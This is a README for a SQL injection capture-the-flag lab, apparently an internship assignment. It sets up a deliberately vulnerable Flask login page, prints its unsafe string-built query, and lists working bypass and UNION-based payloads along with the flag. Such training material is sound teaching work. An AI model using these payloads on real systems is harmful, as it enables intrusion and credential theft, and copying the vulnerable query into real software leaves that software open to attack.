SQL Injection Challenge: Authentication Bypass
Challenge Overview

This challenge demonstrates a SQL injection vulnerability in the login form of SecureCorp's employee portal.
Your goal is to bypass authentication and retrieve the admin password (flag) from the database.

This guide provides step-by-step instructions for setting up, running, and exploiting the challenge using either Docker (recommended) or a manual Python setup.

Challenge Details

Category: Web Security

Difficulty: Easy

Vulnerability Type: SQL Injection – Authentication Bypass

Flag Format: RAZZ{sql1_bYP4sS_MAst3r}

Prerequisites

Before starting, ensure you have one of the following setup options available:

Option A: Docker (Recommended)

Docker installed

Basic familiarity with Docker commands

For Linux: sudo privileges or user added to the Docker group

Option B: Manual Python Setup

Python 3.11+

pip package manager

Basic familiarity with Python virtual environments

Step 1: Download/Clone the Challenge
1.1 Open Terminal/Command Prompt

Windows: Command Prompt, PowerShell, or Windows Terminal

macOS: Terminal or iTerm2

Linux: Terminal, GNOME Terminal, or Konsole

1.2 Navigate to Desired Directory
cd path/to/your/directory

1.3 Clone the Repository
git clone https://github.com/KerberoSec/Razz_Security_Internship_Assignment.git

1.4 Navigate to Project Directory
cd Razz_Security_Internship_Assignment

1.5 Verify Files
ls -la


Expected structure:

├── app.py
├── Dockerfile
├── README.md
├── requirements.txt
└── templates
    └── index.html

2 directories, 5 files

Step 2: Docker Setup (Recommended)
2.1 Build the Docker Image

With sudo (if required):

sudo docker build -t sqli-challenge .


Without sudo:

docker build -t sqli-challenge .

2.2 Run the Docker Container
sudo docker run -d -p 5000:5000 --name sqli-challenge sqli-challenge

2.3 Verify Container is Running
sudo docker ps


Expected output:

abc123def456   sqli-challenge   "python app.py"  5 seconds ago   Up 4 seconds   0.0.0.0:5000->5000/tcp   sqli-challenge

2.4 Access Application

Open in browser:

http://localhost:5000

Step 3: Manual Python Setup (Alternative)
3.1 Create Virtual Environment
python -m venv venv


Activate environment:

macOS/Linux:

source venv/bin/activate


Windows:

venv\Scripts\activate

3.2 Install Dependencies
pip install -r requirements.txt

3.3 Run Application
python app.py

3.4 Access Application
http://localhost:5000

Step 4: Exploitation Guide
4.1 Vulnerable Code
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

4.2 Identifying Injection

Navigate to:

http://localhost:5000

4.3 Bypass Authentication

Payload:

Username: admin' --

Password: anything

Resulting query:

SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'

4.4 Retrieve Flag

After logging in as admin, the flag will be displayed:

RAZZ{sql1_bYP4sS_MAst3r}

4.5 Alternative Payloads

Method 1: Always True

Username: admin' OR '1'='1
Password: anything


Method 2: Union Injection

Username: admin' UNION SELECT 1,password,3 FROM users WHERE username='admin' --
Password: anything

Step 5: Database Schema & Data
5.1 Schema
id INTEGER PRIMARY KEY AUTOINCREMENT,
username TEXT UNIQUE NOT NULL,
password TEXT NOT NULL,
is_admin INTEGER DEFAULT 0

5.2 Sample Data
1   admin       RAZZ{sql1_bYP4sS_MAst3r}   1
2   john_doe    password123                0
3   jane_smith  securepass                 0

Step 6: Management Commands
6.1 Docker

List containers

sudo docker ps


Stop container

sudo docker stop sqli-challenge


Start container

sudo docker start sqli-challenge


Remove container

sudo docker rm sqli-challenge


Remove image

sudo docker rmi sqli-challenge


View logs

sudo docker logs sqli-challenge

6.2 Python Virtual Environment

Deactivate

deactivate


Reactivate (Windows)

venv\Scripts\activate


Reinstall dependencies

pip install --force-reinstall -r requirements.txt

Step 7: Troubleshooting

Port already in use: Use another port or stop conflicting service

Docker permission denied: Add user to Docker group or use sudo

Module not found: Ensure venv is activated and run pip install -r requirements.txt

Database errors: Check file permissions for SQLite DB file

Step 8: Learning Objectives

Understand SQL injection in login forms

Exploit authentication bypass

Learn input validation & parameterized queries

Recognize security risks of unsanitized SQL queries

Step 9: Security Best Practices

Always use parameterized queries

Validate & sanitize user inputs

Implement proper error handling

Use least-privilege DB accounts

Regularly update dependencies

Deploy a Web Application Firewall (WAF)

Step 10: Additional Resources

OWASP SQL Injection Prevention Cheat Sheet

PortSwigger SQL Injection Tutorial

Flask Security Guidelines
